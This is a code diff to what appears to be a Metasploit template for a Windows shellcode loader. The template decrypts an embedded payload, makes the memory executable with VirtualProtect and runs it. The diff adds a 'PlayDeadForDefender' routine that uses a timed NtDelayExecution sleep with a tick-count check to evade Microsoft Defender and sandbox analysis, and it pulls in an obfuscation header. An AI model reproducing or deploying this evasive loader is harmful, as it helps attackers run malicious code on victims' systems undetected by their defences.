@@ -1,6 +1,6 @@
-#include <Windows.h>
+#include <windows.h>
 #include <stdio.h>
-#include <obfusheader.h>
+#include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"
 
 #define SCSIZE <%= encoded_payload_length %>
 #define SCSIZE_ENC <%= encrypted_payload_length %>
@@ -8,18 +8,6 @@
 char bPayload[SCSIZE_ENC];
 char bPayloadEncoded[<%= encrypted_payload.length %>] = "<%= encrypted_payload %>";
 char bControlBytes[<%= encryption_rounds %>] = "<%= control_bytes %>";
-
-typedef union _LARGE_INTEGER {
-    struct {
-        DWORD LowPart;
-        LONG HighPart;
-    } DUMMYSTRUCTNAME;
-    struct {
-        DWORD LowPart;
-        LONG HighPart;
-    } u;
-    __int64 QuadPart;
-    } LARGE_INTEGER, *PLARGE_INTEGER;
 
 typedef NTSTATUS (__stdcall *fnNtDelayExecution)(
 	BOOLEAN              Alertable,
@@ -46,6 +34,37 @@ void DecodePayload()
     }
 }
 
+int PlayDeadForDefender()
+{
+
+    DWORD               dwMilliSeconds        = 24000;
+	LARGE_INTEGER       DelayInterval         = { 0 };
+	LONGLONG            Delay                 = 0;
+    NTSTATUS            STATUS                = 0;
+        DWORD               _T0                   = 0, 
+        _T1                   = 0;
+        
+    Delay = dwMilliSeconds * 10000;
+	DelayInterval.QuadPart = - Delay;
+
+    fnNtDelayExecution fncNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary("ntdll.dll"), "NtDelayExecution");
+
+    _T0 = GetTickCount();
+
+    STATUS = fncNtDelayExecution(FALSE, &DelayInterval);
+    if (STATUS != 0) {
+        return 0;
+        }
+
+    _T1 = GetTickCount();
+
+    if (_T1 - _T0 < dwMilliSeconds) {
+        return 0;
+    }
+
+    return 1;
+}
+
 char GetKey(char control_byte)
 {
 	char hardcoded = bPayload[0];
@@ -67,18 +86,24 @@ char GetKey(char control_byte)
                 }
         }
 int main() {
-	DWORD dwOldProtect;
-	char* payload_fnc = NULL;
+    DWORD dwOldProtect;
+    char* payload_fnc = NULL;
+    printf("Playing dead for defender\n"); 
+    if(!PlayDeadForDefender())
+    {
+      return -1;
+    }
+    printf("Decoding and decrypting\n"); 
     DecodePayload();
-        for(int i = 0; i < <%= encryption_rounds %>; i++)
-        {
-                DecryptPayload(bControlBytes[i]);
-        }
-        payload_fnc = bPayload+1;
-        VirtualProtect(bPayload, SCSIZE_ENC, PAGE_EXECUTE_READWRITE, &dwOldProtect);
-        
-        (*(void (*)()) payload_fnc)();
+    for(int i = 0; i < <%= encryption_rounds %>; i++)
+    {
+            DecryptPayload(bControlBytes[i]);
+    }
+    payload_fnc = bPayload+1;
+    VirtualProtect(bPayload, SCSIZE_ENC, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+    printf("Calling payload\n"); 
+    (*(void (*)()) payload_fnc)();
 
-	return 1;
+    return 1;
 }
 
